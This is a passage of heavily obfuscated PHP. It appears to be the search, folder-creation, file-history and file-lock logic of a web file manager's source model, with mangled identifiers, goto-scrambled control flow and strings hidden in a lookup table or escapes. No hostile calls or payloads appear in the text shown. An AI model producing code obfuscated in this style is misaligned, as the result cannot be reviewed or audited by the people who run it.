array($EÉ§Ï«äµË[387] => array($EÉ§Ï«äµË[7], $cÑœ‘ÀÃª)); goto DŒÁØÍëî‹; cøæšÆ±Åæ: foreach ($Bî“åÒøÖ´ as $A¿ÙÛô°Ãõ) { $a¬Ğ÷±œ×‹ = $EÉ§Ï«äµË[47] . $cæ™‘–³è˜[$EÉ§Ï«äµË[479]] . $EÉ§Ï«äµË[47]; if (stripos($A¿ÙÛô°Ãõ[$EÉ§Ï«äµË[477]], $a¬Ğ÷±œ×‹) !== !1) { $a„¸æ³Âï[] = $A¿ÙÛô°Ãõ; } } $BÎÃ˜™æ™º[$EÉ§Ï«äµË[363]] = array_merge($a„¸æ³Âï, $BÎÃ˜™æ™º[$EÉ§Ï«äµË[363]]); $BÎÃ˜™æ™º[$EÉ§Ï«äµË[360]][$EÉ§Ï«äµË[361]] += count($a„¸æ³Âï); goto cŞ áŠÆ¯; cŞ áŠÆ¯: } public function listSearchChildren($B¤º·ô¦¹‹, $EÜ‹œ¹åÒ = 5000) { goto A˜„¥¬Úœ²; aò–Ó½©¾: $C‹¾Å”ÁÎ» = $this->field($d¹‘í²Î‡[387])->where($C„¶¾Ã÷¥î)->select(); $c˜ÆÇÖ·¢  = array_to_keyvalue($C‹¾Å”ÁÎ», $d¹‘í²Î‡[33], $d¹‘í²Î‡[387]); return $c˜ÆÇÖ·¢ ; goto F…íšˆ×µ¬; d¯’ç›È©é: $C„¶¾Ã÷¥î = array($d¹‘í²Î‡[477] => array($d¹‘í²Î‡[375], $cß„‰®ô[$d¹‘í²Î‡[477]] . $cß„‰®ô[$d¹‘í²Î‡[387]] . $d¹‘í²Î‡[502])); $bØè×Ş’Ó = $this->field($d¹‘í²Î‡[387])->cache(null, 600)->where($C„¶¾Ã÷¥î)->count(); if ($bØè×Ş’Ó > $EÜ‹œ¹åÒ) { return $this->_listSearchChildrenNear($B¤º·ô¦¹‹, $EÜ‹œ¹åÒ); } goto aò–Ó½©¾; A˜„¥¬Úœ²: $d¹‘í²Î‡ =& $_SERVER[Æ¼ôºÙï]; $c˜ÆÇÖ·¢  = array(); $cß„‰®ô = $this->sourceInfo($B¤º·ô¦¹‹); goto d¯’ç›È©é; F…íšˆ×µ¬: } private function _listSearchChildrenNear($fİÛÎÉ©á, $dŠáµÜŸ¢Ğ) { goto a÷¯³¦Ğß‡; BÒŠ›®¡«·: $dÔÔÕ×ÇíÓ = array_merge($dÔÔÕ×ÇíÓ, array_to_keyvalue($D¯¾‡“ç¦, $Fù†ØÈ”«ß[33], $Fù†ØÈ”«ß[387])); $dÔÔÕ×ÇíÓ = array_slice($dÔÔÕ×ÇíÓ, 0, $dŠáµÜŸ¢Ğ); return $dÔÔÕ×ÇíÓ; goto CŸ‚õÓêì; f‡º²…ø“‰: if (!$E¢¾Ù»ªäÃ) { return $dÔÔÕ×ÇíÓ; } $Dé©‹‡Ä“ = array($Fù†ØÈ”«ß[479] => array($Fù†ØÈ”«ß[7], $E¢¾Ù»ªäÃ)); $D¯¾‡“ç¦ = $this->field($Fù†ØÈ”«ß[1908])->where($Dé©‹‡Ä“)->limit($dŠáµÜŸ¢Ğ)->select(); goto BÒŠ›®¡«·; dæ‘™®í‚: $D¯¾‡“ç¦ = $this->field($Fù†ØÈ”«ß[1908])->where($Dé©‹‡Ä“)->select(); $E¢¾Ù»ªäÃ = array_to_keyvalue(array_filter_by_field($D¯¾‡“ç¦, $Fù†ØÈ”«ß[388], $Fù†ØÈ”«ß[86]), $Fù†ØÈ”«ß[33], $Fù†ØÈ”«ß[387]); $dÔÔÕ×ÇíÓ = array_merge($dÔÔÕ×ÇíÓ, array_to_keyvalue($D¯¾‡“ç¦, $Fù†ØÈ”«ß[33], $Fù†ØÈ”«ß[387])); goto f‡º²…ø“‰; a÷¯³¦Ğß‡: $Fù†ØÈ”«ß =& $_SERVER[Æ¼ôºÙï]; $dÔÔÕ×ÇíÓ = array(); $Dé©‹‡Ä“ = array($Fù†ØÈ”«ß[479] => $fİÛÎÉ©á); goto dæ‘™®í‚; CŸ‚õÓêì: } private function _listSearchBindPinyin($FšÂÅä“¦, &$E¾§ÁÚ¦, &$D¡£Ø»Ÿ´–) { goto f¬µ‚”ô£©; Eê†ÉÈÀ´­: $BĞĞÉ­ïì = array(); $D¡£Ø»Ÿ´– = str_replace(array($AÁšÉ´´á[227], $AÁšÉ´´á[50], $AÁšÉ´´á[1909]), $AÁšÉ´´á[33], $D¡£Ø»Ÿ´–); $D¡£Ø»Ÿ´– = $AÁšÉ´´á[1910] . str_replace($AÁšÉ´´á[47], $AÁšÉ´´á[1911], $D¡£Ø»Ÿ´–); goto E­»Ÿˆ³Ñ‡; f¬µ‚”ô£©: $AÁšÉ´´á =& $_SERVER[Æ¼ôºÙï]; if (!Input::check($FšÂÅä“¦[$AÁšÉ´´á[1747]], $AÁšÉ´´á[314]) || strlen($FšÂÅä“¦[$AÁšÉ´´á[1747]]) < 2) { return; } $D÷ïÆ®± = "\114\105\106\124\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\163\x6f\x75\x72\x63\x65\x5f\155\145\x74\141\40\x6d\x65\x74\x61\40\x6f\x6e\x20\x73\157\x75\162\x63\145\56\x73\157\165\162\x63\x65\111\104\x20\75\x20\x6d\x65\164\141\x2e\163\157\x75\x72\143\145\x49\104"; goto Eê†ÉÈÀ´­; E­»Ÿˆ³Ñ‡: $d—¥â¯Ñ˜Â = $E¾§ÁÚ¦[$AÁšÉ´´á[28]]; unset($E¾§ÁÚ¦[$AÁšÉ´´á[28]]); foreach ($E¾§ÁÚ¦ as $eÔí£áŞĞ => $Fï‚æºˆ³º) { $BĞĞÉ­ïì[$AÁšÉ´´á[1910] . $eÔí£áŞĞ] = $Fï‚æºˆ³º; } goto Dë·ªÒÎñ; Dë·ªÒÎñ: foreach ($d—¥â¯Ñ˜Â as $f¼¼õÃ¤¤«) { $BĞĞÉ­ïì[] = array($AÁšÉ´´á[1912] => $f¼¼õÃ¤¤«, $AÁšÉ´´á[936] => $AÁšÉ´´á[1751], array($AÁšÉ´´á[1913] => $f¼¼õÃ¤¤«, $AÁšÉ´´á[1914] => array($AÁšÉ´´á[7], array($AÁšÉ´´á[433], $AÁšÉ´´á[432])))); } $this->join($D÷ïÆ®±); $E¾§ÁÚ¦ = $BĞĞÉ­ïì; goto Dù¤®Û„·»; Dù¤®Û„·»: } private function _parseSearchWhere($b†äß´¶“¶) { goto E°´İšğ; Eƒã«¸ºàÄ: if (isset($b†äß´¶“¶[$bÓêÚøÑó [551]])) { $E¨â·˜æ«ã[] = array($bÓêÚøÑó [397] => $b†äß´¶“¶[$bÓêÚøÑó [551]], $bÓêÚøÑó [396] => $b†äß´¶“¶[$bÓêÚøÑó [551]], $bÓêÚøÑó [936] => $bÓêÚøÑó [1751]); } if (isset($b†äß´¶“¶[$bÓêÚøÑó [390]])) { $DÆ¤èİŞŠ¿ = $b†äß´¶“¶[$bÓêÚøÑó [390]]; if ($DÆ¤èİŞŠ¿ == $bÓêÚøÑó [76]) { $E¨â·˜æ«ã[$bÓêÚøÑó [388]] = 1; } else { if ($DÆ¤èİŞŠ¿ == $bÓêÚøÑó [1920]) { $E¨â·˜æ«ã[$bÓêÚøÑó [388]] = 0; } else { if ($DÆ¤èİŞŠ¿) { $DÆ¤èİŞŠ¿ = is_array($DÆ¤èİŞŠ¿) ? $DÆ¤èİŞŠ¿ : explode($bÓêÚøÑó [47], $DÆ¤èİŞŠ¿); $E¨â·˜æ«ã[$bÓêÚøÑó [390]] = array($bÓêÚøÑó [402], $DÆ¤èİŞŠ¿); $E¨â·˜æ«ã[$bÓêÚøÑó [388]] = 0; } } } } if (isset($b†äß´¶“¶[$bÓêÚøÑó [479]])) { $døÍŒİ‘‡Ó = $this->sourceInfo($b†äß´¶“¶[$bÓêÚøÑó [479]]); $E¨â·˜æ«ã[$bÓêÚøÑó [542]] = array($bÓêÚøÑó [501], $døÍŒİ‘‡Ó[$bÓêÚøÑó [477]] . $b†äß´¶“¶[$bÓêÚøÑó [479]] . $bÓêÚøÑó [502]); } goto B«ÜõÃùì; a†Š™–áø: if (isset($b†äß´¶“¶[$bÓêÚøÑó [465]])) { $C¦«¤œÌÔ = array($bÓêÚøÑó [1916], $b†äß´¶“¶[$bÓêÚøÑó [465]]); if ($E¨â·˜æ«ã[$bÓêÚøÑó [83]]) { $E¨â·˜æ«ã[$bÓêÚøÑó [83]] = array($E¨â·˜æ«ã[$bÓêÚøÑó [83]], $C¦«¤œÌÔ, $bÓêÚøÑó [1917]); } else { $E¨â·˜æ«ã[$bÓêÚøÑó [83]] = $C¦«¤œÌÔ; } } if (isset($b†äß´¶“¶[$bÓêÚøÑó [1918]])) { $E¨â·˜æ«ã[$bÓêÚøÑó [77]] = array($bÓêÚøÑó [1915], $b†äß´¶“¶[$bÓêÚøÑó [1918]]); } if (isset($b†äß´¶“¶[$bÓêÚøÑó [1919]])) { $C¦«¤œÌÔ = array($bÓêÚøÑó [1916], $b†äß´¶“¶[$bÓêÚøÑó [1919]]); if ($E¨â·˜æ«ã[$bÓêÚøÑó [77]]) { $E¨â·˜æ«ã[$bÓêÚøÑó [77]] = array($E¨â·˜æ«ã[$bÓêÚøÑó [77]], $C¦«¤œÌÔ, $bÓêÚøÑó [1917]); } else { $E¨â·˜æ«ã[$bÓêÚøÑó [77]] = $C¦«¤œÌÔ; } } goto Eƒã«¸ºàÄ; B«ÜõÃùì: if (isset($b†äß´¶“¶[$bÓêÚøÑó [1747]]) && $b†äß´¶“¶[$bÓêÚøÑó [1747]]) { $eó›¨ÌË–å = $b†äß´¶“¶[$bÓêÚøÑó [1747]]; $cãÅÁ¦Àˆ = explode($bÓêÚøÑó [50], $eó›¨ÌË–å); if (strlen($eó›¨ÌË–å) > 2 && (substr($eó›¨ÌË–å, 0, 1) == $bÓêÚøÑó [115] && substr($eó›¨ÌË–å, -1) == $bÓêÚøÑó [115]) || substr($eó›¨ÌË–å, 0, 1) == $bÓêÚøÑó [55] && substr($eó›¨ÌË–å, -1) == $bÓêÚøÑó [55]) { $eó›¨ÌË–å = substr($eó›¨ÌË–å, 1, -1); $cãÅÁ¦Àˆ = array($eó›¨ÌË–å); } $E¨â·˜æ«ã[$bÓêÚøÑó [28]] = array(array($bÓêÚøÑó [501], $bÓêÚøÑó [1749] . $eó›¨ÌË–å . $bÓêÚøÑó [1749])); if (count($cãÅÁ¦Àˆ) > 1) { $E¨â·˜æ«ã[$bÓêÚøÑó [28]] = array(); foreach ($cãÅÁ¦Àˆ as $dãÇÀ³±¦™) { if (!trim($dãÇÀ³±¦™)) { continue; } $E¨â·˜æ«ã[$bÓêÚøÑó [28]][] = array($bÓêÚøÑó [501], $bÓêÚøÑó [1749] . trim($dãÇÀ³±¦™) . $bÓêÚøÑó [1749]); } } } return $E¨â·˜æ«ã; goto Eò‰®¼ƒ¹†; E°´İšğ: $bÓêÚøÑó  =& $_SERVER[Æ¼ôºÙï]; $E¨â·˜æ«ã = array(); if (isset($b†äß´¶“¶[$bÓêÚøÑó [721]])) { $E¨â·˜æ«ã[$bÓêÚøÑó [83]] = array($bÓêÚøÑó [1915], $b†äß´¶“¶[$bÓêÚøÑó [721]]); } goto a†Š™–áø; Eò‰®¼ƒ¹†: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($a‘ºå©Ç¾ì) { $a²µàÍ³õ =& $_SERVER[Æ¼ôºÙï]; $cá’ç„Ñâ½ = Model($a²µàÍ³õ[492])->where(array($a²µàÍ³õ[1494] => $a‘ºå©Ç¾ì))->find(); $b£¥¿¾†Œ = $this->_mkdirRoot(SourceModel::TYPE_USER, $a‘ºå©Ç¾ì, $cá’ç„Ñâ½[$a²µàÍ³õ[28]]); $this->userDesktopAdd($b£¥¿¾†Œ); return $b£¥¿¾†Œ; } public function userDesktopAdd($AŞ¨êÕÁÙ) { $DÁÏÓÔ‡Êë =& $_SERVER[Æ¼ôºÙï]; $CÊí¬ñÂ‡ = LNG($DÁÏÓÔ‡Êë[1921]); $fÁ¡ö±ìŞ = $this->mkdir($AŞ¨êÕÁÙ, $CÊí¬ñÂ‡); $this->metaSet($fÁ¡ö±ìŞ, $DÁÏÓÔ‡Êë[1922], $DÁÏÓÔ‡Êë[86]); $this->metaSet($AŞ¨êÕÁÙ, $DÁÏÓÔ‡Êë[1923], $fÁ¡ö±ìŞ); } public function groupRootAdd($c¶ã¸ÎŞ¬ñ) { $FáÁ¢ƒÌ™» =& $_SERVER[Æ¼ôºÙï]; $C©§¤İôƒ = Model($FáÁ¢ƒÌ™»[476])->where(array($FáÁ¢ƒÌ™»[1743] => $c¶ã¸ÎŞ¬ñ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $c¶ã¸ÎŞ¬ñ, $C©§¤İôƒ[$FáÁ¢ƒÌ™»[28]]); } public function systemRootPathAdd($A²‘¼ìğ•) { if ($A²‘¼ìğ• != $_SERVER[Æ¼ôºÙï][1154]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $A²‘¼ìğ•); } public function userRootRemove($cæï‡£´) { $FïŠÅšï¬¬ = $this->sourceRoot(SourceModel::TYPE_USER, $cæï‡£´); if (!$FïŠÅšï¬¬) { return; } $this->remove($FïŠÅšï¬¬, !1); } public function groupRootRemove($e÷¤´øõ·) { $A‹Ã†êºƒ² = $this->sourceRoot(SourceModel::TYPE_GROUP, $e÷¤´øõ·); if (!$A‹Ã†êºƒ²) { return; } $this->remove($A‹Ã†êºƒ², !1); } private function _mkdirRoot($fâä®Í•¬¼, $e®µâä×®ˆ, $BŒÓ˜‰ŠÑ) { goto f´ËÒ™Ê™Ù; D”Ñ¡íÆí²: $CŞš…ºÜ£ˆ = $this->add($BË»œ½§°º); $f¯ŒÎä‡ìÒ = array($FßùïÎõ‰ö[544] => short_id($CŞš…ºÜ£ˆ)); $this->where(array($FßùïÎõ‰ö[401] => $CŞš…ºÜ£ˆ))->save($f¯ŒÎä‡ìÒ); goto e£¹İÁ¶íš; e£¹İÁ¶íš: CacheLock::unlock($C‚Èî³”°); return $CŞš…ºÜ£ˆ; goto CÊä£ˆá“ª; E–¹£Î“®: $C‚Èî³”° = "\115\x6f\x64\x65\x6c\x53\x6f\165\x72\x63\145\56\155\153\x64\x69\x72\122\x6f\x6f\x74\x2e{$fâä®Í•¬¼}\56{$e®µâä×®ˆ}\56" . $BŒÓ˜‰ŠÑ; CacheLock::lock($C‚Èî³”°); $BË»œ½§°º[$FßùïÎõ‰ö[28]] = $BŒÓ˜‰ŠÑ; goto D”Ñ¡íÆí²; f´ËÒ™Ê™Ù: $FßùïÎõ‰ö =& $_SERVER[Æ¼ôºÙï]; $BË»œ½§°º = array($FßùïÎõ‰ö[386] => 0, $FßùïÎõ‰ö[538] => $fâä®Í•¬¼, $FßùïÎõ‰ö[539] => $e®µâä×®ˆ, $FßùïÎõ‰ö[535] => 1, $FßùïÎõ‰ö[540] => USER_ID, $FßùïÎõ‰ö[541] => USER_ID, $FßùïÎõ‰ö[536] => $FßùïÎõ‰ö[33], $FßùïÎõ‰ö[542] => $FßùïÎõ‰ö[488], $FßùïÎõ‰ö[413] => 0, $FßùïÎõ‰ö[537] => 0, $FßùïÎõ‰ö[437] => 0, $FßùïÎõ‰ö[543] => $FßùïÎõ‰ö[33]); if ($B‡òÕ¾Ù¹î = $this->where($BË»œ½§°º)->find()) { return $B‡òÕ¾Ù¹î[$FßùïÎõ‰ö[387]]; } goto E–¹£Î“®; CÊä£ˆá“ª: } private function sourceRoot($d†¯±Û¨àì, $a—¦ÄËÅÄõ, $D—±®Œ‹Ï” = false) { $bÄ¿×§†À =& $_SERVER[Æ¼ôºÙï]; $d›‘ÉœŸò = array($bÄ¿×§†À[386] => 0, $bÄ¿×§†À[538] => $d†¯±Û¨àì, $bÄ¿×§†À[539] => $a—¦ÄËÅÄõ); if ($cß„äùÛ­ = $this->where($d›‘ÉœŸò)->find()) { return $D—±®Œ‹Ï” ? $cß„äùÛ­ : $cß„äùÛ­[$bÄ¿×§†À[387]]; } return !1; } public function sourceRootGroup($Dƒ¢Ó±±‰Œ) { $a¥…·ŠºÁ© =& $_SERVER[Æ¼ôºÙï]; if (is_string($Dƒ¢Ó±±‰Œ)) { $Dƒ¢Ó±±‰Œ = array($Dƒ¢Ó±±‰Œ); } $D”ê…¢Ñ = array($a¥…·ŠºÁ©[386] => 0, $a¥…·ŠºÁ©[538] => SourceModel::TYPE_GROUP, $a¥…·ŠºÁ©[539] => array($a¥…·ŠºÁ©[7], $Dƒ¢Ó±±‰Œ)); $dÈºÓñĞ±ï = $this->listSource($D”ê…¢Ñ, 1000); return array_to_keyvalue($dÈºÓñĞ±ï[$a¥…·ŠºÁ©[74]], $a¥…·ŠºÁ©[474]); } public function mkfile($f¤Ôï…±², $bĞÔß¶¶­‚, $a¬í®÷×İ = '', $EÚ‰ó°××ç = REPEAT_RENAME) { $Eê©îÈÀ¼¤ =& $_SERVER[Æ¼ôºÙï]; $cÕ†ò¡‚“‘ = Model($Eê©îÈÀ¼¤[560])->addFileByContent($a¬í®÷×İ, $bĞÔß¶¶­‚); return $this->_createFileCall($f¤Ôï…±², $bĞÔß¶¶­‚, $cÕ†ò¡‚“‘, $EÚ‰ó°××ç, $Eê©îÈÀ¼¤[1191]); } public function addFile($FŞÖŠ‡¨Ûë, $f£ŸÑøã˜Â, $e½Æíò¢‘°, $Bãµ“óâ® = false, $e£Ãˆ‡õ† = REPEAT_RENAME) { $cØ©ºÇšÔ´ = Model($_SERVER[Æ¼ôºÙï][560])->addFile($f£ŸÑøã˜Â, $e½Æíò¢‘°, $Bãµ“óâ®); return $this->_createFileCall($FŞÖŠ‡¨Ûë, $e½Æíò¢‘°, $cØ©ºÇšÔ´, $e£Ãˆ‡õ†); } public function addFileByFileID($f¿šèŠ®ç¤, $f©—¯šµ‰É, $fŠò—öÖãš, $A¯ˆ»óÏç– = REPEAT_RENAME) { $bƒ›¢ø¤ÉØ =& $_SERVER[Æ¼ôºÙï]; $EÌİšùƒè» = Model($bƒ›¢ø¤ÉØ[560])->find($f©—¯šµ‰É); Model($bƒ›¢ø¤ÉØ[560])->linkAdd($f©—¯šµ‰É); return $this->_createFileCall($f¿šèŠ®ç¤, $fŠò—öÖãš, $EÌİšùƒè», $A¯ˆ»óÏç–); } public function addFileByRemote($eÅê¸“‘¦‘, $A®÷ˆ”¦Ü, $BÆÒù¦“Åë, $C‡„­ùÃØ = array(), $eŒÆ™£Ç– = REPEAT_RENAME) { $DËŒØ™†Š = Model($_SERVER[Æ¼ôºÙï][560])->addFileByRemote($A®÷ˆ”¦Ü, $BÆÒù¦“Åë, $C‡„­ùÃØ); return $this->_createFileCall($eÅê¸“‘¦‘, $BÆÒù¦“Åë, $DËŒØ™†Š, $eŒÆ™£Ç–); } private function _createFileCall($a–¨Úµ¹„, $bàÑÎ¢óÄ, $bˆÍã·°‡Ü, $fãÆŒµê¿Ò, $DÈÍ‹†‚á = "\x75\x70\x6c\x6f\x61\x64") { goto E¼Òğ¢õòé; E¼Òğ¢õòé: $bÈ¦Õ¶‚·ò =& $_SERVER[Æ¼ôºÙï]; $d‰Ş”·†™Ã = !1; $this->lockWriteStart($a–¨Úµ¹„, $bàÑÎ¢óÄ); goto cåá­ÅÁŸê; cåá­ÅÁŸê: $CÓù¼ÄÈ¾— = $this->fileNameExist($a–¨Úµ¹„, $bàÑÎ¢óÄ); $d˜Ïªã‰ˆß = $this->_createFile($a–¨Úµ¹„, $bàÑÎ¢óÄ, $bˆÍã·°‡Ü, $fãÆŒµê¿Ò, $d‰Ş”·†™Ã); if (!$d‰Ş”·†™Ã) { Model($bÈ¦Õ¶‚·ò[439])->remove($bˆÍã·°‡Ü[$bÈ¦Õ¶‚·ò[436]]); } goto bïÆ£‡“É¡; bïÆ£‡“É¡: if ($d‰Ş”·†™Ã && $d˜Ïªã‰ˆß && $d˜Ïªã‰ˆß != $CÓù¼ÄÈ¾—) { Model($bÈ¦Õ¶‚·ò[1893])->eventCreate($d˜Ïªã‰ˆß, $DÈÍ‹†‚á); } $this->lockWriteEnd($a–¨Úµ¹„, $bàÑÎ¢óÄ); return $d˜Ïªã‰ˆß; goto FÏ·‚öĞ¶; FÏ·‚öĞ¶: } public function mkdir($A¤‘‰Œ½ê, $C¦Ïƒ«£´ƒ, $A¯­Ô™— = REPEAT_SKIP) { goto c­ì·´¿ä‡; c­ì·´¿ä‡: $DÊ«Õ–æ÷ò =& $_SERVER[Æ¼ôºÙï]; $b…«ğÂöŒ† = $this->sourceInfo($A¤‘‰Œ½ê); if (!$b…«ğÂöŒ†) { return !1; } goto aÙË¸Œ‰îâ; BÈÛñÊåÉ: $dŞ‘ÂÉƒÓ = $this->_addSoure($a‡õÄšËÊØ, $b…«ğÂöŒ†); Model($DÊ«Õ–æ÷ò[1893])->eventCreate($dŞ‘ÂÉƒÓ, $DÊ«Õ–æ÷ò[1192]); $this->lockWriteEnd($A¤‘‰Œ½ê, $C¦Ïƒ«£´ƒ); goto aÛ’©ÓÛ„; aÙË¸Œ‰îâ: $this->lockWriteStart($A¤‘‰Œ½ê, $C¦Ïƒ«£´ƒ); if ($A¯­Ô™— !== !1) { $eã‹ë…‘˜ß = $this->fileNameExist($A¤‘‰Œ½ê, $C¦Ïƒ«£´ƒ); if ($eã‹ë…‘˜ß && $A¯­Ô™— != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($A¤‘‰Œ½ê, $C¦Ïƒ«£´ƒ); return $eã‹ë…‘˜ß; } $C¦Ïƒ«£´ƒ = $this->fileNameAuto($A¤‘‰Œ½ê, $C¦Ïƒ«£´ƒ, $A¯­Ô™—); } $a‡õÄšËÊØ = array($DÊ«Õ–æ÷ò[535] => 1, $DÊ«Õ–æ÷ò[404] => $C¦Ïƒ«£´ƒ, $DÊ«Õ–æ÷ò[536] => $DÊ«Õ–æ÷ò[33], $DÊ«Õ–æ÷ò[437] => 0, $DÊ«Õ–æ÷ò[537] => 0); goto BÈÛñÊåÉ; aÛ’©ÓÛ„: return $dŞ‘ÂÉƒÓ; goto f‡ùÈÉî; f‡ùÈÉî: } private function _createFile($e¶ÜšñÁ‡å, $B×¦à“±¶, $Aˆñ›÷»¶, $A²°Ä¿‚“·, &$e¾‚…ºñè) { goto C‰™ŠÀ†µí; FÓò§ÌÁäØ: return $a¹¾­†²; goto a¨¸°…¯ƒæ; Aˆ¡–¼…êŸ: $B…ŠöŸòÊ = array($C¨„ãÛÇõ¨[535] => 0, $C¨„ãÛÇõ¨[404] => $B×¦à“±¶, $C¨„ãÛÇõ¨[536] => get_path_ext($B×¦à“±¶), $C¨„ãÛÇõ¨[437] => $Aˆñ›÷»¶[$C¨„ãÛÇõ¨[436]], $C¨„ãÛÇõ¨[537] => $Aˆñ›÷»¶[$C¨„ãÛÇõ¨[77]]); $a¹¾­†² = $this->_addSoure($B…ŠöŸòÊ, $Dåí‘õë„); $this->folderSizeReset($e¶ÜšñÁ‡å, intval($B…ŠöŸòÊ[$C¨„ãÛÇõ¨[77]])); goto FÓò§ÌÁäØ; eÎÒ—Ü˜Ó¼: if ($A²°Ä¿‚“· !== !1) { $A×‚§ò°ß = $this->fileNameExist($e¶ÜšñÁ‡å, $B×¦à“±¶); } $e¾‚…ºñè = !0; if ($A²°Ä¿‚“· && $A×‚§ò°ß) { if ($A²°Ä¿‚“· == REPEAT_SKIP) { $e¾‚…ºñè = !1; return $A×‚§ò°ß; } else { if ($A²°Ä¿‚“· == REPEAT_REPLACE) { $cğ…Â«Ü¨¤ = $this->sourceInfo($A×‚§ò°ß); $C¿²ÓˆÖ = $this->fileHistory($cğ…Â«Ü¨¤, $Aˆñ›÷»¶[$C¨„ãÛÇõ¨[436]], $Aˆñ›÷»¶[$C¨„ãÛÇõ¨[77]]); if (!$C¿²ÓˆÖ) { $e¾‚…ºñè = !1; } else { $this->folderSizeReset($e¶ÜšñÁ‡å); } return $A×‚§ò°ß; } else { $B×¦à“±¶ = $this->fileNameAuto($e¶ÜšñÁ‡å, $B×¦à“±¶, $A²°Ä¿‚“·, !1); } } } goto Aˆ¡–¼…êŸ; C‰™ŠÀ†µí: $C¨„ãÛÇõ¨ =& $_SERVER[Æ¼ôºÙï]; $Dåí‘õë„ = $this->sourceInfo($e¶ÜšñÁ‡å); if (!$Aˆñ›÷»¶ || !$Dåí‘õë„) { return !1; } goto eÎÒ—Ü˜Ó¼; a¨¸°…¯ƒæ: } protected function fileHistory($CÆÄ¯ìÑ„Ù, $bøÇ–›Ÿæ, $Eª‘Ğ‚Ñåô) { goto D§ï“å·; c•ğ±‚‚‹†: $this->sourceCacheClear($CÆÄ¯ìÑ„Ù[$fğÈÔ‹¥İ[387]]); return !0; goto Cš¬”Š¬¾À; D§ï“å·: $fğÈÔ‹¥İ =& $_SERVER[Æ¼ôºÙï]; if ($CÆÄ¯ìÑ„Ù[$fğÈÔ‹¥İ[436]] == $bøÇ–›Ÿæ) { return !1; } $this->checkLock($CÆÄ¯ìÑ„Ù[$fğÈÔ‹¥İ[387]], $bøÇ–›Ÿæ); goto dÇÈ„é½»; dÇÈ„é½»: Model($fğÈÔ‹¥İ[1924])->addHistory($CÆÄ¯ìÑ„Ù); $fËñò¡ºµØ = array($fğÈÔ‹¥İ[541] => USER_ID, $fğÈÔ‹¥İ[408] => time(), $fğÈÔ‹¥İ[436] => $bøÇ–›Ÿæ, $fğÈÔ‹¥İ[77] => $Eª‘Ğ‚Ñåô); $this->where(array($fğÈÔ‹¥İ[401] => $CÆÄ¯ìÑ„Ù[$fğÈÔ‹¥İ[387]]))->save($fËñò¡ºµØ); goto c•ğ±‚‚‹†; Cš¬”Š¬¾À: } public function checkLock($BµÖ‰ Æî, $e÷šùÁšÍ®) { goto Fğ”›–›Ñ‰; b‚ÁËšçôš: $fÒÅÙçÁˆÒ = Session::get($B±ÂöğËÉô[1925]); $C—İ½º‹ø¨ = substr($b¶ãóÃ“¬[$B±ÂöğËÉô[28]], 0, -1 - strlen($b¶ãóÃ“¬[$B±ÂöğËÉô[167]])) . $B±ÂöğËÉô[1454] . $fÒÅÙçÁˆÒ . $B±ÂöğËÉô[94] . $b¶ãóÃ“¬[$B±ÂöğËÉô[167]]; $bİÖºî‹ = Model($B±ÂöğËÉô[560])->find($e÷šùÁšÍ®); goto AÖ‘ÓÊóšÀ; AÖ‘ÓÊóšÀ: $this->_createFileCall($b¶ãóÃ“¬[$B±ÂöğËÉô[479]], $C—İ½º‹ø¨, $bİÖºî‹, REPEAT_REPLACE, $B±ÂöğËÉô[1191]); $DÑçµ×„Â‚ = $b¶ãóÃ“¬[$B±ÂöğËÉô[434]][$B±ÂöğËÉô[499]]; $cåËĞ¾ùŠ = $DÑçµ×„Â‚[$B±ÂöğËÉô[1926]] ? $DÑçµ×„Â‚[$B±ÂöğËÉô[1926]] : $DÑçµ×„Â‚[$B±ÂöğËÉô[28]]; goto A…ğ…Âƒ; Fğ”›–›Ñ‰: $B±ÂöğËÉô =& $_SERVER[Æ¼ôºÙï]; $b¶ãóÃ“¬ = $this->pathInfo($BµÖ‰ Æî); if (!$this->fileIsLock($b¶ãóÃ“¬, !0)) { return; } goto b‚ÁËšçôš; A…ğ…Âƒ: show_json(LNG($B±ÂöğËÉô[1927]) . $B±ÂöğËÉô[1928] . LNG($B±ÂöğËÉô[1929]) . $B±ÂöğËÉô[1930] . $cåËĞ¾ùŠ . $B±ÂöğËÉô[1931], !1); goto Aá‘ŒÏäëæ; Aá‘ŒÏäëæ: } public function fileIsLock($A“•ß¯Ä‡µ, $Eá‚¿¦˜°¯ = false) { goto c‘ìËÀ¥È; F¶š—™×ç: return !1; goto A·Â„î…ø»; DÉŒ™®ßĞô: $C¬êÑ¥‡ŞÔ = $GLOBALS[$fİë…©™‘†[6]][$fİë…©™‘†[87]][$fİë…©™‘†[497]]; if ($A“•ß¯Ä‡µ[$fİë…©™‘†[434]][$fİë…©™‘†[498]] <= time() - $C¬êÑ¥‡ŞÔ) { $this->metaSet($A“•ß¯Ä‡µ[$fİë…©™‘†[387]], $fİë…©™‘†[496], null); $this->metaSet($A“•ß¯Ä‡µ[$fİë…©™‘†[387]], $fİë…©™‘†[498], null); } if ($Eá‚¿¦˜°¯) { $this->metaSet($A“•ß¯Ä‡µ[$fİë…©™‘†[387]], $fİë…©™‘†[498], time()); } goto F¶š—™×ç; c‘ìËÀ¥È: $fİë…©™‘† =& $_SERVER[Æ¼ôºÙï]; if (!isset($A“•ß¯Ä‡µ[$fİë…©™‘†[434]]) || !$A“•ß¯Ä‡µ[$fİë…©™‘†[434]][$fİë…©™‘†[496]]) { return !1; } if ($A“•ß¯Ä‡µ[$fİë…©™‘†[434]][$fİë…©™‘†[496]] != USER_ID) { return !0; } goto DÉŒ™®ßĞô; A·Â„î…ø»: } private function _addSoure($b™•¥É£„, $aÅØŞª‡) { goto EĞš××°¯Û; f—™×âôèø: static $F…ÚÚ¯Ìà = false; if (!$F…ÚÚ¯Ìà) { Hook::trigger($e·À˜›ªĞø[525], $b™•¥É£„); $F…ÚÚ¯Ìà = !0; } $b’öÁØŒˆÔ = $this->add($b™•¥É£„); goto Aíª‚Á¹à¦; EĞš××°¯Û: $e·À˜›ªĞø =& $_SERVER[Æ¼ôºÙï]; $f‹Ü‹ğˆ„ñ = array($e·À˜›ªĞø[538] => $aÅØŞª‡[$e·À˜›ªĞø[389]], $e·À˜›ªĞø[539] => $aÅØŞª‡[$e·À˜›ªĞø[474]], $e·À˜›ªĞø[540] => USER_ID, $e·À˜›ªĞø[541] => USER_ID, $e·À˜›ªĞø[386] => $aÅØŞª‡[$e·À˜›ªĞø[387]], $e·À˜›ªĞø[542] => 